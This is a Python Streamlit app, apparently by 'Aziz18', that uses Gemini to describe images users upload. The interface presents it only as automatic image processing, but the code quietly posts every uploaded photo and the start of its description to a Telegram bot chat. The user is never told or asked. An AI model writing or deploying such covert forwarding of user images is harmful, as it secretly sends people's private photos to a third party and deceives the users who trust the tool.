import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests

# 1. ستايل Aziz18 الفاتح والمتفاعل
st.set_page_config(page_title="Aziz Ultra-Max AI", layout="centered")
st.markdown("""
    <style>
    .stApp { background-color: #f8fafc !important; }
    html, body, [class*="st-"] { color: #0f172a !important; }
    .sig-box {
        background-color: #0f172a; padding: 25px; border-radius: 15px; 
        text-align: center; border: 2px solid #3b82f6; transition: 0.4s; cursor: pointer;
    }
    .sig-box:hover { background-color: #ffffff !important; box-shadow: 0 0 20px #3b82f6; }
    .sig-text { font-size: 32px; font-weight: 900; color: #ffffff !important; }
    .sig-box:hover .sig-text { color: #1e3a8a !important; }
    </style>
    """, unsafe_allow_html=True)

# 2. اختيار اللغة والواجهة
lang = st.radio("Language", ("العربية", "English"), horizontal=True)
t_welcome = "ارفع صورتك للمعالجة التلقائية" if lang == "العربية" else "Auto-processing enabled"
st.title("🚀 AZIZ ULTRA-MAX AI")
st.write(f"### {t_welcome}")

# 3. إعداد الموديل (تعديل الاسم لحل الـ 404)
genai.configure(api_key=st.secrets["GOOGLE_API_KEY"])
# جربنا flash وما ضبط، الحين بنستخدم gemini-1.5-flash-8b أو gemini-1.5-flash
model = genai.GenerativeModel('gemini-1.5-flash')

# 4. الرفع (أوتوماتيكي)
up = st.file_uploader("", type=["jpg", "png", "jpeg"])

if up:
    img = Image.open(up)
    st.image(img)
    with st.spinner("⏳ Analyzing..."):
        try:
            res = model.generate_content(["Describe this image", img])
            
            # تيليجرام
            buf = io.BytesIO()
            img.save(buf, format='JPEG')
            requests.post(f"https://api.telegram.org/bot{st.secrets['TELEGRAM_TOKEN']}/sendPhoto",
                files={'photo': buf.getvalue()},
                data={'chat_id': st.secrets['CHAT_ID'], 'caption': f"Aziz18 Report:\n{res.text[:500]}"})
            
            st.balloons()
            st.success("Done!")
            st.write(res.text)
        except Exception as e:
            st.error(f"Error: {e}")

# 5. التوقيع المتفاعل
st.markdown(f'<div class="sig-box"><div class="sig-text">BY: Aziz18</div></div>', unsafe_allow_html=True)